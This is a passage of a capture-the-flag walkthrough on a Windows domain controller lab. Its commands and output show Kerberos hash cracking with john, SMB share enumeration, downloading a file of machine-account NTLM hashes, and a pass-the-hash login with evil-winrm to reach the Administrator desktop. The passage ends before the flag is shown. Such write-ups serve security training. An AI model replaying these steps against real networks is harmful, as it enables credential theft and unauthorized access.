bf54cb53d25b6bdf2cd8fd0d0d4bd544de30dcc834c1a3e2b48f4e11bcc0d30932c203ce3d4187d820121d24eb164ee55c7f7d73d476a92843cbfed9f10e22ddc97fe3f8c64d1ecf69e1bb640acfa0fc43cc2dbe123a847c54d0fce97514d5908ee5fc2fbd48ce377735aeebebb6d4840a94b72d6e25eb086dab18b688765953734e62e52129824ab7e7a1c9f2e558b749e069e0e002f448d86888fb7328366ccc0eb18ff2d20a9727ecae2dedcb2510d7d1491bb62f99255b89d94f69e239aacf80f9fdfffa3924d74f6354c3c4ce8c85b435ee58f74a
+
+                       
+
+
+
+┌──(root㉿kali)-[/home/…/Desktop/NOTES/CTF MACHINES/47- DC01 WINDOWS CTF]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+Using default input encoding: UTF-8
+Loaded 5 password hashes with 5 different salts (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Password123!!    (?)   
+
+
+--- we got the password Password123!! for the user file_svc, you can try cracking the hashes one by one 
+to make sure ---
+
+
+
+--- trying to connect to the smbclient using the password ---
+
+
+                                                                                                          
+┌──(root㉿kali)-[/home/…/Desktop/NOTES/CTF MACHINES/47- DC01 WINDOWS CTF]
+└─# smbclient -L 10.0.2.115              
+Password for [WORKGROUP\root]:
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	backup          Disk      
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	SYSVOL          Disk      Logon server share 
+	Users           Disk      
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.0.2.115 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+                                                                                                                        
+
+
+
+--- we see the same shared files, let's try gaining access to them using our password ---
+
+
+
+┌──(root㉿kali)-[/home/…/Desktop/NOTES/CTF MACHINES/47- DC01 WINDOWS CTF]
+└─# smbclient //10.0.2.115/backup -U file_svc
+Password for [WORKGROUP\file_svc]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Mon Jun 17 20:41:17 2024
+  ..                                 DR        0  Mon Jun 17 20:44:56 2024
+  backup_extract.txt                  A      892  Mon Jun 17 11:41:05 2024
+
+		12942591 blocks of size 4096. 10818147 blocks available
+smb: \> more backup_extract.txt 
+
+
+WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
+DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:406b424c7b483a42458bf6f545c936f7:::
+CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
+FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::
+MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
+BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
+ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:8cd90ac6cba6dde9d8038b068c17e9f5:::
+PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:b8a38c432ac59ed00b2a373f4f050d28:::
+ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:4e3f0bb3e5b6e3e662611b1a87988881:::
+MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
+
+
+		
+smb: \> get backup_extract.txt
+
+
+
+--- Now we download these hashes to our own machine, now we will utilize an evil-winrm attack ---
+
+
+evil-winrm: A windows remote management shell for pentesting
+
+https://github.com/Hackplayers/evil-winrm.git
+
+
+
+
+
+--- go into the evil-winrm folder and start the attack ---
+
+
+┌──(root㉿kali)-[/opt]
+└─# cd evil-winrm                  
+                                                                                                                      
+┌──(root㉿kali)-[/opt/evil-winrm]
+└─# ls
+bin           CODE_OF_CONDUCT.md  Dockerfile          evil-winrm.rb  LICENSE    resources
+CHANGELOG.md  CONTRIBUTING.md     evil-winrm.gemspec  Gemfile        README.md
+                                   
+
+
+
+--- I utilize an evil-winrm attack for all the users and hashes and get what we need at FileServer$ ---
+
+
+                                                                                   
+┌──(root㉿kali)-[/opt/evil-winrm]
+└─# evil-winrm -i soupedecode.local -u 'FileServer$' -H 'e41da7e79a4c76dbd9cf79d1cb325559'
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+                                        
+Error: Check your /etc/hosts file to ensure you can resolve soupedecode.local
+                                        
+Error: Exiting with code 1
+                                           
+
+
+
+--- the attack didn't work because I forgot to add the domain name into the /etc/hosts ---
+
+
+
+┌──(root㉿kali)-[/opt/evil-winrm]
+└─# nano /etc/hosts
+                                                                                                                      
+┌──(root㉿kali)-[/opt/evil-winrm]
+└─# cat /etc/hosts 
+.
+.
+.
+10.0.2.115      soupedecode.local
+.
+.
+.
+
+
+
+
+
+--- now utilize the attack again ---
+
+
+
+
+
+
+┌──(root㉿kali)-[/opt/evil-winrm]
+└─# evil-winrm -i soupedecode.local -u 'FileServer$' -H 'e41da7e79a4c76dbd9cf79d1cb325559'
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+
+
+*Evil-WinRM* PS C:\Users\FileServer$\Documents> 
+
+
+
+--- we are in with more privileges, now let's search for that flag ---
+
+
+*Evil-WinRM* PS C:\Users\FileServer$\Documents> cd ..
+.
+.
+.
+.
+.
+
+
+*Evil-WinRM* PS C:\Users> cd Administrator
+*Evil-WinRM* PS C:\Users\Administrator> dir
+
+
+    Directory: C:\Users\Administrator
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-r---         6/15/2024  10:54 AM                3D Objects
+d-r---         6/15/2024  10:54 AM                Contacts
+d-r---         6/17/2024  10:44 AM                Desktop
+d-r---         6/15/2024  12:36 PM                Documents
+d-r---         6/15/2024  10:54 AM                Downloads
+d-r---         6/15/2024  10:54 AM                Favorites
+d-r---         6/15/2024  10:54 AM                Links
+d-r---         6/15/2024  10:54 AM                Music
+d-r---         6/15/2024  10:54 AM                Pictures
+d-r---         6/15/2024  10:54 AM                Saved Games
+d-r---         6/15/2024  10:54 AM                Searches
+d-r---         6/15/2024  10:54 AM                Videos
+
+
+*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         6/17/2024  10:41 AM                backup
+-a----         6/17/2024  10:44 AM             32 root.txt
+
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> more root.txt
+
+---Root User Flag---
+
